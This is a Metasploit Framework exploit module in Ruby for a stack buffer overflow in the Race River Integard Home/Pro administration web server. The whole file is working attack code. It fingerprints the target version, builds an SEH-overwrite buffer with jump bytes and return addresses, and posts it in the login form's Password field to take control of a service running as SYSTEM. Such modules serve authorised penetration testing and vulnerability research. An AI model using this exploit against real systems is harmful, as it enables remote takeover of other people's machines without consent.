##
# $Id: integard_password_bof.rb 11344 2010-12-15 19:49:40Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking # stack bof, seh, universal ret, auto targeting

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow',
			'Description'    => %q{
						This module exploits a stack buffer overflow in Race river's Integard Home/Pro
					internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are
					vulnerable.

					The administration web page on port 18881 is vulnerable to a remote buffer overflow
					attack. By sending an long character string in the password field, both the structured
					exception handler and the saved extended instruction pointer are over written, allowing
					an attacker to gain control of the application and the underlying operating system
					remotely.

					The administration website service runs with SYSTEM privileges, and automatically
					restarts when it crashes.
			},
			'Author'  =>
				[
					'Lincoln', # original discovery
					'Nullthreat',
					'rick2600',
					'corelanc0d3r',
					'jduck' # fleshed out module from advisory
				],
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision: 11344 $',
			'References'    =>
				[
					['OSVDB', '67909'],
					['URL','http://www.corelan.be:8800/advisories.php?id=CORELAN-10-061'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars'  => "\x00\x20\x26\x2f\x3d\x3f\x5c",
					'StackAdjustment' => -1500,
				},
			'Platform'       => 'win',
			'Privileged'     => false,
			'Targets'        =>
				[
					[ 'Automatic Targeting',          { 'auto' => true }],
					[ 'Integard Home 2.0.0.9021', { 'Ret' => 0x0041565E,}], # p/p/r
					[ 'Integard Pro  2.2.0.9026', { 'Ret' => 0x0040362C,}], # p/p/r
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Sep 07 2010'))

		register_options(
			[
				Opt::RPORT(18881)
			], self.class )
	end

	def exploit

		mytarget = nil
		if (target['auto'])
			print_status("Automatically detecting the target...")
			response = send_request_raw(
				{
					'uri' => '/banner.jpg',
					'version' => '1.1',
					'method' => 'GET'
				}, 5)

			clen = 0
			clen ||= response['Content-Length'].to_i if response and response['Content-Length']
			case clen
			when 24584
				print_status("[!] Found Version - Integard Home")
				mytarget = targets[1]
			when 23196
				mytarget = targets[2]
				print_status("[!] Found Version - Integard Pro")
			end

		else
			mytarget = target
		end

		if not mytarget
			raise RuntimeError, "Unable to automatically detect the target version"
		end

		print_status("Selected Target: #{mytarget.name}")

		print_status("Building Buffer")
		pay = payload.encoded
		buffer = ''
		buffer << rand_text_alpha_upper(3091 - pay.length)
		buffer << pay
		buffer << "\xE9\x2B\xF8\xFF\xFF"
		buffer << "\xEB\xF9\x90\x90"
		buffer << [mytarget.ret].pack('V')

		print_status("Sending Request")
		send_request_raw({
				'uri' => '/LoginAdmin',
				'version' => '1.1',
				'method' => 'POST',
				'headers' =>
					{
						'Host' => '192.168.1.1:18881',
						'Content-Length' => 1074
					},
				'data' => "Password=" + buffer + "&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=0&LoginButtonName=Login"
			}, 5)

		print_status("Request Sent")

		handler
	end
end
